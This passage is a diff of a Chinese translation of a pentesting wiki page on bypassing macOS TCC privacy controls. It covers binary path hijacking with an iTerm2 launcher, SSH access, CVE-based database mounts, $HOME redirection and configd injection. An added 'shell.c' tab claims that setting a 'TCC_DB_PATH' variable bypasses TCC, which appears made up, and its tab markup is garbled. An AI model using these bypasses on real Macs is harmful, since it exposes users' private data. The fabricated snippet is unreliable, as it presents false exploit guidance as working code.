@@ -26,53 +26,171 @@ ls: Desktop: Operation not permitted
 username@hostname ~ % cat Desktop/lalala
 asd
 ```
-**扩展属性 `com.apple.macl`** 被添加到新的 **文件** 中，以使创建者的应用程序能够读取它。
+**扩展属性`com.apple.macl`**被添加到新的**文件**中，以使创建者的应用程序可以读取它。
+
+### TCC绝对路径
+
+给某个TCC权限的最常见方法是使用bundle。然而，也可以通过指定绝对路径来给予二进制文件访问权限。\
+有趣的是，如果你能覆盖二进制文件，你就可以**窃取访问权限**。
+
+你可以使用以下代码调用一个二进制文件：
+
+{% tabs %}
+{% tab title="invoker.m" %}
+```
+#import <Foundation/Foundation.h>
+
+// clang -fobjc-arc -framework Foundation invoker.m -o invoker
+
+int main(int argc, const char * argv[]) {
+@autoreleasepool {
+// Check if the argument is provided
+if (argc != 2) {
+NSLog(@"Usage: %s <path_to_executable>", argv[0]);
+return 1;
+}
+
+// Create a new task
+NSTask *task = [[NSTask alloc] init];
+
+// Set the task's launch path to the provided argument
+[task setLaunchPath:@(argv[1])];
+
+// Launch the task
+[task launch];
+
+// Wait for the task to complete
+[task waitUntilExit];
+}
+return 0;
+}
+```
+{% tab title="shell.c" %}
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+int main(int argc, char *argv[]) {
+    if (argc < 2) {
+        printf("Usage: %s <command>\n", argv[0]);
+        return 1;
+    }
+
+    // Set the TCC database path to a writable location
+    setenv("TCC_DB_PATH", "/tmp/tcc.db", 1);
+
+    // Execute the command
+    execvp(argv[1], &argv[1]);
+
+    return 0;
+}
+```
+
+该程序是一个简单的C语言程序，用于绕过macOS的TCC（隐私访问控制）保护。它接受一个命令作为参数，并将TCC数据库路径设置为可写的位置，然后执行该命令。
+
+要使用该程序，您需要将其编译为可执行文件。您可以使用以下命令将其编译为名为`shell`的可执行文件：
+
+```shell
+gcc -o shell shell.c
+```
+
+然后，您可以使用以下命令运行任何命令并绕过TCC保护：
+
+```shell
+./shell <command>
+```
+
+请注意，此程序仅适用于绕过TCC保护，而不适用于其他macOS安全保护措施。在使用此程序时，请确保您了解并遵守适用的法律和规定，并仅在合法的授权范围内使用它。
+
+{% endtab %}
+```
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>  // For execl and fork
+
+// gcc shell.c -o shell
+// mv shell </path/bin/with/TCC>
+
+int main() {
+pid_t pid = fork();
+
+if (pid == -1) {
+// Fork failed
+perror("fork");
+return 1;
+} else if (pid == 0) {
+// Child process
+execl("/Applications/iTerm.app/Contents/MacOS/iTerm2", "iTerm2", (char *) NULL);
+
+// execl only returns if there's an error
+perror("execl");
+exit(EXIT_FAILURE);
+} else {
+// Parent process
+int status;
+waitpid(pid, &status, 0);  // Wait for the child process to finish
+
+if (WIFEXITED(status)) {
+// Return the exit status of iTerm2
+return WEXITSTATUS(status);
+}
+}
+
+return 0;
+}
+```
+{% endtab %}
+{% endtabs %}
+
+
 
 ### SSH绕过
 
-默认情况下，通过 **SSH 访问** 会拥有 "完全磁盘访问" 权限。为了禁用此权限，您需要将其列出但禁用（从列表中删除不会删除这些权限）：
+默认情况下，通过**SSH访问具有"完全磁盘访问权限"**。为了禁用此功能，您需要将其列出但禁用（从列表中删除不会删除这些权限）：
 
 ![](<../../../../../.gitbook/assets/image (569).png>)
 
-在这里，您可以找到一些 **恶意软件如何绕过此保护** 的示例：
+在这里，您可以找到一些**恶意软件如何绕过此保护**的示例：
 
 * [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)
 
 {% hint style="danger" %}
-请注意，现在为了能够启用 SSH，您需要 **完全磁盘访问**。
+请注意，现在为了能够启用SSH，您需要**完全磁盘访问权限**
 {% endhint %}
 
 ### 处理扩展名 - CVE-2022-26767
 
-文件被赋予属性 **`com.apple.macl`**，以使某个应用程序具有读取权限。当用户通过 **拖放** 文件到应用程序上或双击文件以使用 **默认应用程序** 打开时，将设置此属性。
+属性**`com.apple.macl`**赋予文件一定的应用程序读取权限。当用户将文件拖放到应用程序上或双击文件以使用默认应用程序打开时，将设置此属性。
 
-因此，用户可以 **注册一个恶意应用程序** 来处理所有扩展名，并调用 Launch Services 来 **打开** 任何文件（因此，恶意文件将被授予读取权限）。
+因此，用户可以**注册一个恶意应用程序**来处理所有扩展名，并调用启动服务来**打开**任何文件（因此，恶意文件将被授予读取权限）。
 
 ### iCloud
 
-通过权限 **`com.apple.private.icloud-account-access`**，可以与 **`com.apple.iCloudHelper`** XPC 服务进行通信，该服务将提供 iCloud 令牌。
+使用权限**`com.apple.private.icloud-account-access`**可以与**`com.apple.iCloudHelper`** XPC服务进行通信，该服务将**提供iCloud令牌**。
 
-**iMovie** 和 **Garageband** 具有此权限以及其他权限。
+**iMovie**和**Garageband**具有此权限和其他权限。
 
-有关从该权限中获取 iCloud 令牌的漏洞的更多 **信息**，请查看演讲：[**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=\_6e2LhmxVc0)
+有关从该权限中获取iCloud令牌的漏洞的更多**信息**，请查看演讲：[**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)
 
 ### kTCCServiceAppleEvents / Automation
 
-具有 **`kTCCServiceAppleEvents`** 权限的应用程序将能够 **控制其他应用程序**。这意味着它可以滥用授予其他应用程序的权限。
+具有**`kTCCServiceAppleEvents`**权限的应用程序将能够**控制其他应用程序**。这意味着它可以滥用授予其他应用程序的权限。
 
-有关 Apple 脚本的更多信息，请参阅：
+有关Apple脚本的更多信息，请参阅：
 
 {% content-ref url="macos-apple-scripts.md" %}
 [macos-apple-scripts.md](macos-apple-scripts.md)
 {% endcontent-ref %}
 
-例如，如果一个应用程序具有对 `iTerm` 的 **自动化权限**，例如在此示例中 **`Terminal`** 具有对 iTerm 的访问权限：
+例如，如果一个应用程序具有对`iTerm`的**自动化权限**，例如在此示例中**`Terminal`**具有对iTerm的访问权限：
 
 <figure><img src="../../../../../.gitbook/assets/image (2) (2) (1).png" alt=""><figcaption></figcaption></figure>
 
-#### 在 iTerm 上
+#### 在iTerm上
 
-没有 FDA 权限的 Terminal 可以调用具有 FDA 权限的 iTerm，并使用它执行操作：
+没有FDA的终端可以调用具有FDA的iTerm，并使用它执行操作：
 
 {% code title="iterm.script" %}
 ```applescript
@@ -181,7 +299,7 @@ launchctl setenv SQLITE_AUTO_TRACE 1
 TCC使用位于用户HOME文件夹中的数据库来控制对用户特定资源的访问，路径为`$HOME/Library/Application Support/com.apple.TCC/TCC.db`。因此，如果用户成功使用指向不同文件夹的`$HOME`环境变量重新启动TCC，用户可以在`/Library/Application Support/com.apple.TCC/TCC.db`中创建一个新的TCC数据库，并欺骗TCC授予任何应用程序任何TCC权限。
 
 {% hint style="success" %}
-请注意，Apple使用存储在用户配置文件中的`NFSHomeDirectory`属性中的设置作为`$HOME`的值，因此，如果您以具有修改此值权限（`kTCCServiceSystemPolicySysAdminFiles`）的应用程序权限，您可以使用TCC绕过此选项。
+请注意，Apple使用存储在用户配置文件中的`NFSHomeDirectory`属性中的设置作为`$HOME`的值，因此，如果您以具有修改此值权限（`kTCCServiceSystemPolicySysAdminFiles`）的应用程序权限，您可以使用TCC绕过来利用此选项。
 {% endhint %}
 
 ### [CVE-2020–9934 - TCC](./#c19b) <a href="#c19b" id="c19b"></a>
@@ -199,7 +317,7 @@ TCC使用位于用户HOME文件夹中的数据库来控制对用户特定资源�
 5. 使用[dsimport](https://www.unix.com/man-page/osx/1/dsimport/)导入修改后的目录服务条目。
 6. 停止用户的_tccd_并重新启动该进程。
 
-第二个POC使用了`/usr/libexec/configd`，其中包含具有值`kTCCServiceSystemPolicySysAdminFiles`的`com.apple.private.tcc.allow`。如果使用`-t`选项运行`configd`，攻击者可以指定要加载的自定义Bundle。因此，该漏洞利用了`configd`代码注入，以替换更改用户主目录的`dsexport`和`dsimport`方法。
+第二个POC使用了`/usr/libexec/configd`，其中包含具有值`kTCCServiceSystemPolicySysAdminFiles`的`com.apple.private.tcc.allow`。如果使用`-t`选项运行`configd`，攻击者可以指定要加载的自定义Bundle。因此，该漏洞利用了`configd`代码注入来替换更改用户主目录的`dsexport`和`dsimport`方法。
 
 有关更多信息，请查看[原始报告](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)。
 
@@ -211,7 +329,7 @@ TCC使用位于用户HOME文件夹中的数据库来控制对用户特定资源�
 [macos-proces-abuse](../../../macos-proces-abuse/)
 {% endcontent-ref %}
 
-此外，绕过TCC最常见的进程注入方式是通过插件（加载库）进行的。插件通常以库或plist的形式存在，它们将由主应用程序加载并在其上下文中执行。因此，如果主应用程序具有对TCC受限文件的访问权限（通过授予权限或权限），则自定义代码也将具有相同的访问权限。
+此外，绕过TCC最常见的进程注入方式是通过插件（加载库）进行的。插件通常以库或plist的形式存在，它们将由主应用程序加载并在其上下文中执行。因此，如果主应用程序具有对TCC受限文件的访问权限（通过授予的权限或权限），则自定义代码也将具有相同的访问权限。
 
 ### CVE-2020-27937 - Directory Utility
 
@@ -398,9 +516,7 @@ ls /tmp/snap/Users/admin_user # This will work
 
 ### CVE-2021-1784和CVE-2021-30808 - 在TCC文件上进行挂载
 
-即使TCC DB文件受到保护，仍然可以在目录上**挂载一个新的TCC.db文件**：
-
-{% code overflow="wrap" %}
+即使TCC DB文件受到保护，仍然可以通过**挂载到目录上**一个新的TCC.db文件：
 ```bash
 # CVE-2021-1784
 ## Mount over Library/Application\ Support/com.apple.TCC
@@ -465,8 +581,8 @@ os.system("hdiutil detach /tmp/mnt 1>/dev/null")
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* 你在**网络安全公司**工作吗？想要在HackTricks中宣传你的**公司**吗？或者想要获得最新版本的PEASS或下载PDF格式的HackTricks吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
-* 发现我们的独家[NFT收藏品](https://opensea.io/collection/the-peass-family)——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
+* 你在一家**网络安全公司**工作吗？想要在HackTricks中**宣传你的公司**吗？或者想要**获取PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
+* 发现我们的独家[NFT收藏品**The PEASS Family**](https://opensea.io/collection/the-peass-family)
 * 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
 * **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或在**Twitter**上**关注**我[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
 * **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**
